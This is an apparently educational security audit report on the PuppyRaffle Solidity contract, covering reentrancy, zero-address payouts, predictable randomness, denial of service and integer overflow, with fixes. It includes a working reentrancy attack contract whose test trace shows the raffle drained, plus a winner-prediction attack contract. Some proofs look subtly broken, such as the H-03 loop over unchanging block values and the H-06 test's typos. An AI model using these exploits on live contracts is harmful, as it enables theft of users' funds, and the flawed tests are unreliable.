# PuppyRaffle_Audit_Report

## H-01.Reentrancy Vulnerability In ` refund() ` Function

### Summary

When a player calls the ` refund() ` function,there is no logic to promptly mark that the player has made a refund.



### Vulnerability Details

The vulnerability is located in the ` refund() ` function on the line 101 of the ` PuppyRaffle.sol ` file, which can cause the re-entrancy.

This is because it first send Ether to the msg.sender and then update the state of the contract.

So the attacker's contract can re-enter the ` refund() ` function before the state is updated.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);// @audit - the reentrancy!!!

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```



### Proof of Concept

#### Attack Contract

```solidity
contract Exp {
    PuppyRaffle puppyRaffle;
    uint256 index;
    constructor(address addr) payable {
        puppyRaffle = PuppyRaffle(addr);
    }
    function Attack() public {
        // enter the raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value : 1 ether}(players);

        // get the index of the player
        index = puppyRaffle.getActivePlayerIndex(address(this));

        // re-entrancy attack
        puppyRaffle.refund(index);
    }
    receive() external payable {
        uint256 balance = address(puppyRaffle).balance;
        if (balance > 0) {
            // re-entrancy
            puppyRaffle.refund(index);
        }
    }
}
```

#### Test Case

```solidity
function testReFundReEntrancy() public {
    // 4 players enter the raffle
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value : entranceFee * 4}(players);
    // attacker's contract enter the raffle
    Exp exp = new Exp{value : 2 ether}(address(puppyRaffle));
    string memory beforeAttackPuppyRaffleBalance = vm.toString(address(puppyRaffle).balance / 1 ether);
    string memory beforeAttackExpBalance = vm.toString(address(exp).balance / 1 ether);
    // Before Attack Balance: PuppyRaffle->4ether,Exp->2ether
    console.log("Before Attack Balance: PuppyRaffle->%sether,Exp->%sether", beforeAttackPuppyRaffleBalance, beforeAttackExpBalance);
    // re-entrancy attack
    exp.Attack();
    // After Attack Balance: PuppyRaffle->0ether,Exp->6ether
    string memory afterAttackPuppyRaffleBalance = vm.toString(address(puppyRaffle).balance / 1 ether);
    string memory afterAttackExpBalance = vm.toString(address(exp).balance / 1 ether);
    console.log("After Attack Balance: PuppyRaffle->%sether,Exp->%sether", afterAttackPuppyRaffleBalance, afterAttackExpBalance);
}
```

#### Run The Test

```bash
forge test --mt testReFundReEntrancy -vvvv
```

#### Output

```bash
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testReFundReEntrancy() (gas: 609113)
Logs:
  Before Attack Balance: PuppyRaffle->4ether,Exp->2ether
  After Attack Balance: PuppyRaffle->0ether,Exp->6ether

Traces:
  [629013] PuppyRaffleTest::testReFundReEntrancy()
    ├─ [121825] PuppyRaffle::enterRaffle{value: 4000000000000000000}([0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
    │   ├─ emit RaffleEnter(newPlayers: [0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
    │   └─ ← [Stop] 
    ├─ [314430] → new Exp@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 1458 bytes of code
    ├─ [0] VM::toString(4) [staticcall]
    │   └─ ← [Return] "4"
    ├─ [0] VM::toString(2) [staticcall]
    │   └─ ← [Return] "2"
    ├─ [0] console::log("Before Attack Balance: PuppyRaffle->%sether,Exp->%sether", "4", "2") [staticcall]
    │   └─ ← [Stop] 
    ├─ [120836] Exp::Attack()
    │   ├─ [34804] PuppyRaffle::enterRaffle{value: 1000000000000000000}([0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   ├─ emit RaffleEnter(newPlayers: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   └─ ← [Stop] 
    │   ├─ [2934] PuppyRaffle::getActivePlayerIndex(Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   │   └─ ← [Return] 4
    │   ├─ [50993] PuppyRaffle::refund(4)
    │   │   ├─ [41712] Exp::receive{value: 1000000000000000000}()
    │   │   │   ├─ [40649] PuppyRaffle::refund(4)
    │   │   │   │   ├─ [31368] Exp::receive{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [30305] PuppyRaffle::refund(4)
    │   │   │   │   │   │   ├─ [21024] Exp::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   ├─ [19961] PuppyRaffle::refund(4)
    │   │   │   │   │   │   │   │   ├─ [10680] Exp::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [9617] PuppyRaffle::refund(4)
    │   │   │   │   │   │   │   │   │   │   ├─ [336] Exp::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   ├─ emit RaffleRefunded(player: Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   ├─ emit RaffleRefunded(player: Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   ├─ emit RaffleRefunded(player: Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit RaffleRefunded(player: Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit RaffleRefunded(player: Exp: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::toString(0) [staticcall]
    │   └─ ← [Return] "0"
    ├─ [0] VM::toString(6) [staticcall]
    │   └─ ← [Return] "6"
    ├─ [0] console::log("After Attack Balance: PuppyRaffle->%sether,Exp->%sether", "0", "6") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.21ms (376.46µs CPU time)

Ran 1 test suite in 1.20s (1.21ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

If exploited,this vulnerability could allow attacker's contract drain all the Ether from the PuppyRaffle contract,leading to loss of the funds for the contract and its users.



### Recommendation

To fix the vulnerability,you can reorder the code to update the state before sending the Ether.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // update the state before sending the Ether
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}
```



## H-02.Potential Loss of Funds During Prize Pool Distribution

### Summary

When a player has called the ` refunded() ` function,the player's address is replaced with address(0),the money in the prize pool may be sent to address(0),resulting in fund loss.

### Vulnerability Details

The vulnerability is located in the ` refund() ` function on line 103 and the ` selectWinner() ` function on line 151 of the ` PuppyRaffle.sol ` file,which mat lead to a potential loss of the funds.

```solidity
function refund(uint256 playerIndex) public {
    ...
    players[playerIndex] = address(0);
    ...
}

function selectWinner() external {
    ...
    (bool success,) = winner.call{value: prizePool}("");// @audit - The address of winner may be address(0)
    ...
}
```



### Impact

The loss of the funds.



### Recommendation

Add logic to check whether the address is zero in the ` selectWinner() ` function.

```solidity
function selectWinner() external {
    ...
    require(winner != address(0),"Player already refunded!");
    previousWinner = winner;
    (bool success,) = winner.call{value: prizePool}("");// @audit - The address of winner may be address(0)
    ...
}
```



## H-03.Selection Of Winner Is Not Truly Random

### Summary

The selection of the winner is not truly random,allowing an attacker to create a contract that calculates the winner.



### Vulnerability Details

The vulnerability is located in the ` selectWinner() ` function on line 129 of the ` PuppyRaffle.sol ` file.

```solidity
function selectWinner() external {
    ...
    uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    ...
}
```

All the variables to get the random winner on the function are blockchain variables and are known to everyone,the attacker can use a contract to calculate the final winner and push the contract address in.



### Proof of Concept

#### Attack Contract

```solidity
contract Exp {
    PuppyRaffle pr;
    constructor(address addr) payable {
        pr = PuppyRaffle(addr);
    }
    function Attack() public payable {
        uint256 winnerIndex = 0;
        while (true) {
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this), 
                            block.timestamp, 
                            block.difficulty
                        )
                    )
                ) % 4;
            if (winnerIndex == 3) {
                break;
            }
        }
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(this);
        pr.enterRaffle{value : pr.entranceFee() * 1}(newPlayers);
        pr.selectWinner();
    }
}
```

#### Test Case

```solidity
function testAttackerCalculateWinner() public {
    address[] memory players = new address[](3);
    players[0] = makeAddr("playerOne");
    players[1] = makeAddr("playerTwo");
    players[2] = makeAddr("playerThree");
    puppyRaffle.enterRaffle{value : entranceFee * 3}(players);
    Exp exp = new Exp{value : entranceFee * 2}(address(puppyRaffle));
    exp.Attack();
}
```



### Impact

The Attacker can meticulously calculate based on the known information from the blockchain and become the winner.



### Recommendation

Use Chainlink's VRF to generate a random number to select the winner.



## H-04.Potential Vulnerability to DoS Attack

### Summary

When a player called the ` refund() ` function,he can get the refunds from the contract. 

However,the contract merely changes his address to address(0) and does not actually remove him from the address[] array。

If the winner is that player,the transaction will keep reverting when the contract calls the ` _safeMint ` function.



### Vulnerability Details

The vulnerability is located in the ` refund() ` function on line 103 and the ` selectWinner() ` function on line 153 of the ` PuppyRaffle.sol ` file,which mat lead to a potential DoS attack.

```solidity
function refund(uint256 playerIndex) public {
    ...
    players[playerIndex] = address(0);
    ...
}

function selectWinner() external {
    ...
    _safeMint(winner, tokenId);
    ...
}
```



### Proof of Concept

#### Test Case

```solidity
function testDosAttack() public playersEntered {
    // set the block.timestamp
    vm.warp(block.timestamp + duration + 1);
    // set the block.number
    vm.roll(block.number + 1);

    // playerFour call the refund
    // winner:playerFour
    vm.prank(playerFour);
    puppyRaffle.refund(3);

    // contract no ether
    // catch the expected revert
    // OutOfFunds error
    vm.expectRevert();
    puppyRaffle.selectWinner();

    // send 4 ether to puppyRaffle
    // pass the OutOfFunds error
    vm.deal(address(puppyRaffle), 4 ether);
    // catch the expected revert
    vm.expectRevert("ERC721: mint to the zero address");
    puppyRaffle.selectWinner();
}
```



#### Run The Test

```bash
forge test --mt testDosAttack -vvvv
```



#### Output

```bash
[PASS] testDosAttack() (gas: 266120)
Traces:
  [337916] PuppyRaffleTest::testDosAttack()
    ├─ [121825] PuppyRaffle::enterRaffle{value: 4000000000000000000}([0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
    │   ├─ emit RaffleEnter(newPlayers: [0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
    │   └─ ← [Stop]
    ├─ [0] VM::warp(86402 [8.64e4])
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [0] VM::prank(Identity: [0x0000000000000000000000000000000000000004])
    │   └─ ← [Return]
    ├─ [34296] PuppyRaffle::refund(3)
    │   ├─ [15] PRECOMPILES::identity{value: 1000000000000000000}(0x)
    │   │   └─ ← [Return]
    │   ├─ emit RaffleRefunded(player: Identity: [0x0000000000000000000000000000000000000004])
    │   └─ ← [Stop]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [73702] PuppyRaffle::selectWinner()
    │   ├─ [0] 0x0000000000000000000000000000000000000000::fallback{value: 3200000000000000000}()
    │   │   └─ ← [OutOfFunds] EvmError: OutOfFunds
    │   └─ ← [Revert] revert: PuppyRaffle: Failed to send prize pool to winner
    ├─ [0] VM::deal(PuppyRaffle: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 4000000000000000000 [4e18])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:   ERC721: mint to the zero address)
    │   └─ ← [Return]
    ├─ [73831] PuppyRaffle::selectWinner()
    │   ├─ [0] 0x0000000000000000000000000000000000000000::fallback{value: 3200000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] revert: ERC721: mint to the zero address
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.44ms (294.85µs CPU time)

Ran 1 test suite in 954.44ms (2.44ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

The vulnerability can lead to the DoS Attack.



### Recommendation

Remove users who have already called the ` refund() ` function.

```solidity
function refund(uint256 playerIndex) public {
    ...
    // players[playerIndex] = address(0);
    // move the last element to the position of the element to be deleted
    players[playerIndex] = players[players.length - 1];
    // pop the last element
    players.pop()
    ...
}
```



## H-05.Typecasting From uint256 to uint64 may cause overflow

### Summary

The type conversion from uint256 to uint64 may cause the overflow.



### Vulnerability Details

The vulnerability is located in the ` selectWinner() ` function on line 134 of the ` PuppyRaffle.sol ` file.

It may potentially cause overflow problems if the ` fee ` value exceeds the maximum value of the uint64.

```solidity
function selectWinner() external {
    ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);// @audit - may cause the overflow
    ...
}
```



### Proof of Concept

#### Test Case

```solidity
function testOverFlow() public {
    uint64 totalFees = 100;
    // the maximum value of uint64 is 2**64 - 1
    uint256 fee = 2**64;
    uint64 res = totalFees + uint64(fee);
    assertTrue(totalFees == res, "False");
}
```

#### Output

```bash
[PASS] testOverFlow() (gas: 382)
Traces:
  [382] PuppyRaffleTest::testOverFlow()
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.25ms (58.95µs CPU time)

Ran 1 test suite in 10.45ms (2.25ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

This vulnerability can lead to incorrect calculation of ` totalFees `.



### Recommendation

Define ` totalFees ` as ` uint256 ` so that no conversion is needed later,and overflow will not occur.

```solidity
// uint64 public totalFees = 0;
uint256 public totalFees = 0;

function selectWinner() external {
    ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    // totalFees = totalFees + uint64(fee);
    totalFees = totalFees + fee;
    ...
}
```



## H-06.Overflow/Underflow vulnerabilities before version 0.8.0

### Summary

Before version 0.8.0,there were overflow and underflow vulnerabilities.



### Vulnerability Details

The vulnerability is located in the ` selectWinner() ` function and the ` enterRaffle ` function of the ` PuppyRaffle.sol ` file.

```solidity
function selectWinner() external {
    ...
    uint256 prizePool = (totalAmountCollected * 80) / 100;// @audit - may cause an overflow
    uint256 fee = (totalAmountCollected * 20) / 100;
    ...
}
```

For example,if the value of ` totalAmountCollected * 80 ` or the value of ` totalAmountCollected * 20 ` exceeds 2**256,the final result will be incorrect.



### Proof of Concept

#### Test Case

```solidity
function testOverFlow() public {
    // 0x0x11afd6ec0e14115d9f83c3bcb9ea87945f91518df47740000000000000000000 < 2**256 - 1
    // 0x0x11afd6ec0e14115d9f83c3bcb9ea87945f91518df47740000000000000000000 * 80 > 2**256 - 1
    uint256 totalAmountCollected = 8000000000000000000000000000000000000000000000000000000000000000000000000000;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 rightRes = 6400000000000000000000000000000000000000000000000000000000000000000000000000;
    assertFalse(prizePool == rightRes, "Equal");
    string memory prizePoolStr = vm.toString(prizePool);
    consloe.log("prizePool:", prizePoolStr);
}
```

#### Output

```bash
[PASS] testOverFlow() (gas: 8191)
Logs:
  prizePool: 610395538134190228821450749565604607336500766717971798027120799604343518003

Traces:
  [8191] PuppyRaffleTest::testOverFlow()
    ├─ [0] VM::toString(610395538134190228821450749565604607336500766717971798027120799604343518003 [6.103e74]) [staticcall]
    │   └─ ← [Return] "610395538134190228821450749565604607336500766717971798027120799604343518003"
    ├─ [0] console::log("prizePool:", "610395538134190228821450749565604607336500766717971798027120799604343518003") [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.07ms (3.75ms CPU time)

Ran 1 test suite in 12.14ms (6.07ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



### Impact

This vulnerability can lead to incorrect calculations,which pay potentially result in financial losses for users.



### Recommendation

Use the ` SafeMath ` Library:

```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";
using SafeMath for uint256;

function selectWinner() external {
    ...
    // uint256 totalAmountCollected = players.length * entranceFee;
    uint256 totalAmountCollected = players.length.mul(entranceFee);
    // uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 prizePool = totalAmountCollected.mul(80).div(100);
    // uint256 fee = (totalAmountCollected * 20) / 100;
    uint256 fee = totalAmountCollected.mul(20).div(100);
    // totalFees = totalFees + uint64(fee);
    totalFees = totalFees.add(fee);
    ...
}
```

